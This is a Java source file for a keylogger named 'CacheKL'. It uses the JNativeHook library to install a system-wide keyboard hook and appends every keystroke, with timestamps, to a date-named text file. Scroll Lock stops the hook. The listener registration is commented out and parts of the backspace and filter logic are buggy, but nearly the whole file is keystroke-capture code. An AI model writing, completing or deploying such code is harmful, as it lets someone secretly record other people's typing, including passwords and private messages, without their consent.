package testes;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class CacheKL implements NativeKeyListener {

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (Exception e) {
            JOptionPane.showMessageDialog(null, e.getMessage());
        }
        //GlobalScreen.getInstance().addNativeKeyListener(new CacheKL());
    }

    boolean clicar;
    boolean teclar;

    Date data = new Date();
    SimpleDateFormat fd = new SimpleDateFormat("dd-MM-yyyy");
    String fdd = fd.format(data);
    Date hora = new Date();
    SimpleDateFormat fh = new SimpleDateFormat("[--HH:mm:ss--]");
    String fhh = fh.format(hora);

    File file = new File(fdd + ".txt");

    public void colocarHora() {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(new File(fdd + ".txt"), true))) {
            if (teclar == false) {
                writer.newLine();
                writer.write(fhh);
                writer.newLine();
                clicar = false;
                teclar = true;
                writer.close();
            }
        } catch (IOException ex) {
            JOptionPane.showMessageDialog(null, ex.getMessage());
        }
    }

    public void nativeKeyPressed(NativeKeyEvent nke) {
        String dados = NativeKeyEvent.getKeyText(nke.getKeyCode());
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(new File(fdd + ".txt"), true))) {
            colocarHora();
            if (nke.getKeyCode() == NativeKeyEvent.VC_SCROLL_LOCK) {
                try {
                    GlobalScreen.unregisterNativeHook();
                } catch (NativeHookException ex) {
                    JOptionPane.showMessageDialog(null, ex);
                }
            } else if (nke.getKeyCode() == NativeKeyEvent.VC_ENTER) {
                writer.newLine();
                writer.flush();
            } else if (nke.getKeyCode() == NativeKeyEvent.VC_SPACE) {
                writer.write(" ");
                writer.flush();
            } else if (nke.getKeyCode() == NativeKeyEvent.VC_BACKSPACE) {
                dados = dados.replace("Backspace", "");
                BufferedReader br = new BufferedReader(new FileReader(fdd + ".txt"));
                String data = "";
                String displayText = "";
                while ((displayText = br.readLine()) != null) {
                    data += displayText;
                }
                String c = data;
                data = data.substring(data.length() - 1, data.length());
                writer.write(dados, 0, c.lastIndexOf(data));
                writer.flush();
            } else if (nke.getKeyCode() == NativeKeyEvent.VC_EQUALS) {
                writer.write("=");
            } else if (nke.getKeyCode() == NativeKeyEvent.VC_CONTROL_L
                    || nke.getKeyCode() == NativeKeyEvent.VC_CONTROL_R
                    || nke.getKeyCode() == NativeKeyEvent.VC_ALT_L
                    || nke.getKeyCode() == NativeKeyEvent.VC_ALT_R) {
                writer.flush();
                 } else if (!dados.matches("/^[0-9a-zA-Z.,\b]+$/")) {
                writer.write(dados);
                writer.flush();
            }
            writer.close();
        } catch (IOException ex) {
            JOptionPane.showMessageDialog(null, ex.getMessage());
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke
    ) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke
    ) {
//        String dados = NativeKeyEvent.getKeyText(nke.getKeyCode());
//        try (BufferedWriter writer = new BufferedWriter(new FileWriter(new File(fdd + ".txt"), true))) {
//            if (nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_L
//                    || nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_R
//                    && nke.getKeyCode() == NativeKeyEvent.VC_1) {
//                writer.write("!");
//            } else if (nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_L
//                    || nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_R
//                    && nke.getKeyCode() == NativeKeyEvent.VC_2) {
//                writer.write("@");
//            } else if (nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_L
//                    || nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_R
//                    && nke.getKeyCode() == NativeKeyEvent.VC_3) {
//                writer.write("#");
//            } else if (nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_L
//                    || nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_R
//                    && nke.getKeyCode() == NativeKeyEvent.VC_4) {
//                writer.write("$");
//            } else if (nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_L
//                    || nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_R
//                    && nke.getKeyCode() == NativeKeyEvent.VC_5) {
//                writer.write("%");
//            } else if (nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_L
//                    || nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_R
//                    && nke.getKeyCode() == NativeKeyEvent.VC_6) {
//                writer.write("¨");
//            } else if (nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_L
//                    || nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_R
//                    && nke.getKeyCode() == NativeKeyEvent.VC_7) {
//                writer.write("&");
//            } else if (nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_L
//                    || nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_R
//                    && nke.getKeyCode() == NativeKeyEvent.VC_8) {
//                writer.write("*");
//            } else if (nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_L
//                    || nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_R
//                    && nke.getKeyCode() == NativeKeyEvent.VC_9) {
//                writer.write("(");
//            } else if (nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_L
//                    || nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_R
//                    && nke.getKeyCode() == NativeKeyEvent.VC_0) {
//                writer.write(")");
//            } else if (nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_L
//                    || nke.getKeyCode() == NativeKeyEvent.VC_SHIFT_R
//                    && nke.getKeyCode() == NativeKeyEvent.VC_EQUALS) {
//                writer.write("+");
//            }
//        } catch (IOException ex) {
//            JOptionPane.showMessageDialog(null, ex.getMessage());
//        }

    }
}
